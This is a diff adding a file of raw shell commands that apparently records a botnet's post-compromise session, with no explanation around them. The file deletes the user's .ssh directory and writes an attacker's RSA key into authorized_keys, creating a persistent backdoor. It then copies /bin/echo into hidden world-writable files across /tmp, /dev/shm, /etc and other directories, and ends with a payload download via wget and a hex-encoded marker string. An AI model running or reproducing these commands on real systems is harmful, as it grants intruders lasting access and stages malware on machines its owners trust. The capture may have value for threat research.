@@ -1,0 +1,89 @@
+cd ~; chattr -ia .ssh; lockr -ia .ssh
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
+chmod -R go= ~/.ssh
+cd ~
+cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;
+cp /bin/echo /home/.z
+/home/.z
+cd /home/
+rm -rf .i
+cp .z .i
+cp .i .d
+chmod 777 .i
+chmod 777 .d
+cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;
+cp /bin/echo /.z
+/.z
+cd /
+rm -rf .i
+cp .z .i
+cp .i .d
+chmod 777 .i
+chmod 777 .d
+cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;
+cp /bin/echo /tmp/.z
+/tmp/.z
+cd /tmp/
+rm -rf .i
+cp .z .i
+cp .i .d
+chmod 777 .i
+chmod 777 .d
+cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;
+cp /bin/echo /var/tmp/.z
+/var/tmp/.z
+cd /var/tmp/
+rm -rf .i
+cp .z .i
+cp .i .d
+chmod 777 .i
+chmod 777 .d
+cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;
+cp /bin/echo /dev/netslink/.z
+/dev/netslink/.z
+cd /dev/netslink/
+rm -rf .i
+cp .z .i
+cp .i .d
+chmod 777 .i
+chmod 777 .d
+cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;
+cp /bin/echo /dev/.z
+/dev/.z
+cd /dev/
+rm -rf .i
+cp .z .i
+cp .i .d
+chmod 777 .i
+chmod 777 .d
+cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;
+cp /bin/echo /var/.z
+/var/.z
+cd /var/
+rm -rf .i
+cp .z .i
+cp .i .d
+chmod 777 .i
+chmod 777 .d
+cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;
+cp /bin/echo /etc/.z
+/etc/.z
+cd /etc/
+rm -rf .i
+cp .z .i
+cp .i .d
+chmod 777 .i
+chmod 777 .d
+cp /bin/echo /dev/shm/.z && >/dev/shm/.z && cd /dev/shm/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;
+cp /bin/echo /dev/shm/.z
+/dev/shm/.z
+cd /dev/shm/
+rm -rf .i
+cp .z .i
+cp .i .d
+chmod 777 .i
+chmod 777 .d
+wget (sha256: 942641e3997f98bd38ad91561f50910b071a9c495fdff745996cd6c0c2212c18); echo -e '\x67\x61\x79\x66\x67\x74';
+wget
+echo -e \x67\x61\x79\x66\x67\x74
+
